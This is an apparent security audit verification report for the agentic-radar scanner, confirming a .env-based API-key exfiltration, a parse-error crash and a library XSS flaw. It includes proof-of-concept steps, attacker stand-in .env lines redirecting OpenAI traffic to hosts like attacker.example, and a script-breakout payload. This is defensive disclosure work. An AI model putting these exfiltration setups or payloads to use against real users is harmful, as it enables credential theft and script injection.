## 1. Executive Summary

### 1.1 Background

Independent verification of an external audit covering three claims: (a) `load_dotenv()` at import causes an attacker-controlled `.env` to redirect the OpenAI SDK and exfiltrate the API key during `scan openai-agents`; (b) the LangGraph analyzer crashes on unparsable Python; (c) the HTML report template lacks autoescaping and is XSS-prone.

### 1.2 Overall Posture

Claim (a) is real and reproduced end-to-end: `scan openai-agents` performs LLM calls unconditionally, and the deprecated `dotenv` package searches upward from the *installed module's* path, so a repo-root `.env` above an in-repo `.venv` is loaded and `OPENAI_BASE_URL` is honoured by the SDK. Two POSTs carrying `Authorization: Bearer <key>` were received by a user-controlled listener, with no flag or confirmation. Field exposure is conditional and was bounded empirically: the hostile `.env` must be an ancestor of the *installed* package (in-repo venv or editable install), and the victim must hold a key in the environment. An install outside the untrusted tree (`pipx`/system/standalone venv) was tested and sent nothing to the listener — the dummy key went to the real OpenAI endpoint and was rejected 401. See RT-01 → Real-World Exploitability.

Claim (b) is real: any unparsable `.py` in the scanned directory yields `UnboundLocalError: cannot access local variable 'tree'` and aborts the whole scan.

Claim (c) is real but narrower than stated: the CLI path escapes the graph before rendering (negative control passed, 0 literal breakouts). The public library function `agentic_radar.report.generate()` performs no escaping and emits raw `</script><script>` breakouts, so the flaw is latent for downstream library consumers only.

Systemic issue: implicit ambient configuration (`load_dotenv` at import) combined with unconditional network egress at scan time. Symptomatic issues: one uninitialised-variable crash, one missing output-encoding boundary in the library API.

### 1.4 Recommendation Summary

| Priority | Action | Finding |
|---|---|---|
| P1 | Stop calling `load_dotenv()` implicitly at import; if env files are supported, require an explicit `--env-file` and never search outside an explicit directory. Refuse non-default `OPENAI_BASE_URL` unless explicitly passed/whitelisted. | RT-01 |
| P2 | Require an explicit flag for LLM-backed analysis, and show the resolved base URL before sending prompts. | RT-01 |
| P2 | `return []` after the parse-error branch (or re-raise with context). | RT-02 |
| P3 | Escape inside `generate()` (autoescape or `html.escape` on node names) so library callers get safe output. | RT-03 |

## 4. Findings Detail

### RT-01 — Attacker-controlled `.env` redirects OpenAI base URL and exfiltrates API key during `scan openai-agents`

- **Severity:** High
- **CVSS 3.1:** 7.4 — `https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`
- **CWE:** CWE-426 (Untrusted Search Path), CWE-522 (Insufficiently Protected Credentials)
- **Affected URL/Area:** `agentic_radar/cli.py:37` (`load_dotenv()`), `agentic_radar/analysis/openai_agents/analyze.py` → `parsing/vulnerabilities.py` (`openai.OpenAI()`)
- **Difficulty to exploit:** Low (author a repo containing `.env`; the documented workflow puts the venv inside the repo)
- **Authentication required:** No (attacker); victim supplies their own API key
- **User interaction required:** Yes (victim runs the scanner on the repo)
- **Verified at (UTC):** 2026-11-11T23:16:38Z

#### Issue Description

`agentic_radar/cli.py` calls `load_dotenv()` at module import with no path. The declared dependency is the deprecated `dotenv` 0.9.9 distribution, which vendors the historical python-dotenv implementation: `find_dotenv()` walks upward starting from the calling frame's file. When the console script executes, that frame is `.../.venv/lib/python3.12/site-packages/agentic_radar/cli.py`, so the search traverses `.venv/lib/.../agentic_radar` → `.venv` → the repository root. A repo shipping `.env` therefore wins. `override=False` means pre-exported variables win, but `OPENAI_BASE_URL` is typically not exported.

Separately, `scan openai-agents` calls the vulnerability analyzer unconditionally; the analyzer constructs `openai.OpenAI()` and calls `chat.completions.create(model="gpt-4o", ...)`. Because the OpenAI SDK reads `OPENAI_BASE_URL` at client construction, every scan sends the victim's key to the attacker-selected endpoint. No flag, prompt, or confirmation is involved. The documented GitHub Actions example (`examples/github_workflow/auto-agentic-radar.yaml`) creates `.venv` inside the checkout, matching the exploit precondition.

#### Attack Scenario

1. Attacker publishes an agent repository containing `.env` with `OPENAI_BASE_URL=https://attacker.example/v1`.
2. Victim clones it, follows the project's own workflow (`python -m venv .venv`, `pip install agentic-radar[openai-agents]`), exports `OPENAI_API_KEY`, and runs `agentic-radar scan openai-agents`.
3. Import-time `load_dotenv()` loads the repo `.env`; the analyzer issues LLM requests to the attacker.
4. Attacker logs `Authorization: Bearer <victim key>` and reuses it against the real API.

#### Steps to Reproduce / PoC

Prerequisites: Python 3.12, network access to PyPI, loopback port 8899 free, dummy key only.

1. Create throwaway install: `python3.12 -m venv $T/.venv && $T/.venv/bin/pip install "/home/teycir/ResearchAIRedTeam/agentic-radar[openai-agents]"`.
2. Write repo-root `$T/.env` containing `OPENAI_BASE_URL=http://127.0.0.1:8899/v1`.
3. Start listener: `python3 engagement/pocs/exfil_listener.py engagement/evidence/listener.log 8899`.
4. From an unrelated directory: `cd / && OPENAI_API_KEY=sk-DUMMY-DO-NOT-USE $T/.venv/bin/agentic-radar scan openai-agents -i $T/sample -o engagement/evidence/report.html`.
5. Observe the listener log: two POSTs to `/v1/chat/completions` with `Authorization: Bearer sk-DUMMY-DO-NOT-USE`.

Note: a test driven with `python -c` does **not** reproduce the upward walk because `python -c` has no `__main__.__file__` and the library falls back to the current working directory. The real console entrypoint is required.

#### Impact

Anyone who scans an untrusted agent repository with `scan openai-agents` can have their OpenAI credential delivered to an attacker endpoint. The key permits billing abuse, quota exhaustion, and access to account-level resources until revoked. Real-world reach is bounded by the victim having a key in the environment and running the documented venv-inside-repo flow; the workflow example itself normalises that pattern.

#### Real-World Exploitability

**Precondition (verified, not inferred):** `find_dotenv()` walks upward from the directory of the *installed* `agentic_radar` package, not from the directory being scanned. The hostile `.env` must therefore be an ancestor of the installed package — in practice an in-repo `.venv` or an editable install inside the untrusted repository. `pipx`, system-wide, and standalone-venv installs are **not** exposed: tested with the hostile `.env` in the working directory, the scanner sent 0 requests to the listener and the dummy key went to the real OpenAI endpoint (401). Evidence: `evidence/rt01_negative_control_outside_venv.txt`.

**Paths seen in real workflows:**

1. **"Clone and follow the README."** Attacker publishes an agent repo whose instructions create `.venv` in-tree and install `agentic-radar`. The repo ships `.env` with `OPENAI_BASE_URL=https://collect.attacker.tld/v1`. The victim's scan completes normally; the credential is posted during the scan.
2. **Build-time generation (stealth).** No `.env` appears in the tree. A `Makefile` or `setup.sh` writes it and creates the venv at build time, so review and diffs show nothing unusual.
3. **CI / repository compromise.** A malicious commit or dependency lands in a repo whose pipeline creates `.venv` in the checkout and runs the scan. The CI secret travels in an `Authorization` header, so platform log masking provides no protection.

**What does not work:**

- `pipx`, system-wide, or standalone-venv install: package lives outside the untrusted tree, so the repo `.env` is never on the upward path (verified: 0 requests).
- `OPENAI_BASE_URL` already exported in the environment: `load_dotenv(override=False)`, so the file loses to the existing variable.
- Scanning a trusted repository: no attacker-controlled `.env` exists.
- No server, no unauthenticated remote path, and nothing wormable; every path requires the victim to run the scan against hostile code with an in-tree install.

**Likelihood:** impact High (live credential, direct billing abuse); likelihood Low–Moderate. The tool is niche, but its user base is security staff who routinely scan untrusted repositories and hold organisation keys, and the project's own Actions example normalises the in-repo venv. Skill required: trivial — one committed file or one build step. Detection: egress to a non-OpenAI host, or an unexplained `OPENAI_BASE_URL` in a scanned repository.

#### Affected Demographic

Developers and CI runners executing `agentic-radar scan openai-agents` against third-party repositories, especially in the project's own GitHub Actions pattern.

#### Recommended Fix

- Remove import-time `load_dotenv()`; accept an explicit `--env-file` and load only that exact path (`dotenv_values` + explicit assignment).
- Refuse to send requests when `OPENAI_BASE_URL` differs from the SDK default unless the user passed a visible flag, and print the resolved base URL before use.
- Make LLM-backed analysis opt-in (`--enable-llm-analysis`) so a plain scan never transmits credentials.
- Replace the deprecated `dotenv` dependency with `python-dotenv` only if explicit loading is retained.

### RT-02 — Unparsable Python in scanned directory raises `UnboundLocalError` and aborts LangGraph scan

- **Severity:** Medium
- **CVSS 3.1:** 5.5 — `https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H`
- **CWE:** CWE-457 (Use of Uninitialized Variable)
- **Affected URL/Area:** `agentic_radar/analysis/langgraph/predefined_tools.py:11-30`
- **Difficulty to exploit:** Low
- **Authentication required:** No
- **User interaction required:** Yes
- **Verified at (UTC):** 2026-11-11T23:23:07Z

#### Issue Description

`extract_imports_with_ast` catches `ast.parse` failures, prints a message, and then falls through to `ast.walk(tree)` while `tree` was never assigned. The exception escapes and aborts the entire LangGraph scan, so any repository containing one syntactically invalid `.py` file cannot be analysed.

#### Attack Scenario

A repository includes a deliberately broken Python file (or a template file with a non-Python extension parsed as Python); the victim's scan dies before report generation.

#### Steps to Reproduce / PoC

1. `mkdir -p $T/lg_bad && printf 'def broken(:\n  pass\n' > $T/lg_bad/bad.py`
2. `cd / && $T/.venv/bin/agentic-radar scan langgraph -i $T/lg_bad -o /tmp/opencode/lg.html`
3. Observe `UnboundLocalError: cannot access local variable 'tree' where it is not associated with a value` at `predefined_tools.py:18`.

#### Request

```
$ $T/.venv/bin/agentic-radar scan langgraph -i $T/lg_bad -o /tmp/opencode/lg.html
```

#### Response

```
  File ".../agentic_radar/analysis/langgraph/predefined_tools.py:18 in extract_imports_with_ast
    ❱   for node in ast.walk(tree):
UnboundLocalError: cannot access local variable 'tree' where it is not
associated with a value
```

#### Evidence artifacts

- `evidence/rt02_langgraph_crash.txt` — verbatim run with live UTC timestamp, `sha256 ae3e880c4fd0efd037bed353da58b8d563a0fe36d2a5c9364389ab05602ce526`
- Negative control: a valid Python file in the same directory scans normally.

#### Impact

Availability only: attacker-influenced or merely malformed input prevents analysis. No memory corruption or code execution.

#### Affected Demographic

Users scanning LangGraph projects that contain generated, vendored, or template `.py` files with syntax errors.

#### Recommended Fix

Add `return []` in the `except` branch, or re-raise with the file path. Consider `ast.parse(..., type_comments=True)` and reporting parse failures as warnings.

#### References

- CWE-457: https://cwe.mitre.org/data/definitions/457.html

### RT-03 — `report.generate()` emits unescaped graph names, enabling script breakout for library consumers

- **Severity:** Medium
- **CVSS 3.1:** 6.1 — `https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- **CWE:** CWE-79
- **Affected URL/Area:** `agentic_radar/report/report.py:56`, `agentic_radar/report/templates/template.html.jinja:9`
- **Difficulty to exploit:** Medium (requires a downstream consumer of the public API)
- **Authentication required:** No
- **User interaction required:** Yes
- **Verified at (UTC):** 2026-11-11T23:23:08Z

#### Issue Description

`Graph.generate()` returns JSON that the template injects inside a `<script>` block. The CLI calls `sanitize_graph()` first, which HTML-escapes node names, so CLI output is safe. However, `generate()` is publicly exported from `agentic_radar.report` and performs no escaping; a node name containing `</script><script>…` breaks out of the script element in generated HTML.

#### Attack Scenario

A service wraps `agentic_radar.report.generate()` to render user-supplied agent graphs. A malicious graph name injects script into the report served to an analyst.

#### Steps to Reproduce / PoC

1. Install the package and call the public API with a crafted node name (script in `pocs/` if needed):

```python
from agentic_radar.report import GraphDefinition, NodeDefinition, EdgeDefinition, generate
g = GraphDefinition(
    framework="n8n", name="direct-lib-call",
    nodes=[NodeDefinition(id="s", name="Start", node_type="basic"),
           NodeDefinition(id="e", name="</script><script>document.title='LIBPWN'</script>", node_type="agent"),
           NodeDefinition(id="x", name="End", node_type="basic")],
    edges=[EdgeDefinition(start="s", end="e"), EdgeDefinition(start="e", end="x")],
)
generate(g, "out.html")
```

2. In `out.html`, the literal string `</script><script>document.title='LIBPWN'</script>` appears once (grep count 1), and no `&lt;/script&gt;` appears.

#### Request

```
POST /render  (downstream app using the library)
{"name":"</script><script>document.title='LIBPWN'</script>"}
```

#### Response

```
HTTP/1.1 200 OK
Content-Type: text/html

<script>const __INLINE_DATA = {"nodes":[...</script><script>document.title='LIBPWN'</script>...]}</script>
```

#### Evidence artifacts

- `evidence/direct_generate_unsanitized.html` — literal breakout present, `sha256 837cc1146fafb74314fbec87a7ac1aec8d97ef136f658d0a955b456caf7e67ec`
- `evidence/rt03_generate_checks.txt` — live counts + timestamp, `sha256 7a7981abcdfd72e92843f6508004c927e4af1e2553e0b6ae4c3c14411c2ef02c`
- Negative control: `evidence/n8n_cli_report.html` — CLI path escapes the same payload (`&lt;/script&gt;…`, 0 literal breakouts), `sha256 4309c379bc8b6538edfd9179c3db759a60eaaad5c0414a7b5a9ac1511b7eb7de`

#### Impact

Script execution in the origin serving generated reports, with access to that origin's cookies and DOM. Exploitation requires a downstream application that passes untrusted graph data to `generate()`; the `agentic-radar` CLI itself is not affected.

#### Affected Demographic

Integrators embedding `agentic_radar.report.generate()` in web services.

#### Recommended Fix

Escape node names/labels inside `generate()` (Jinja autoescape for `.html.jinja`, or `html.escape` in `Graph.generate()`), and document that `|safe` fields are trusted-only. Treat CLI sanitisation as defence in depth, not the sole boundary.

- **"Template lacks autoescape, therefore CLI reports are XSS-prone."** Refuted for the CLI: the same `</script><script>` payload was HTML-escaped by `sanitize_graph()`; the generated CLI report contained `&lt;/script&gt;…` and zero literal breakouts. - **"`python -m venv` outside the repo suffices."** Tested and refuted as an exposure path: an install at `/tmp/opencode/radar-outside` scanning `/tmp/opencode/evilrepo` (which contained the hostile `.env`) produced 0 listener requests; the dummy key reached the real OpenAI endpoint and was rejected 401. The `.env` must be an ancestor of the installed package. Evidence `evidence/rt01_negative_control_outside_venv.txt`, verified 2026-11-11T23:33:31Z.
- **CrewAI `RecursionError` on deeply nested expressions** (external claim): not re-verified in this engagement; no evidence collected. Recorded as unproven.
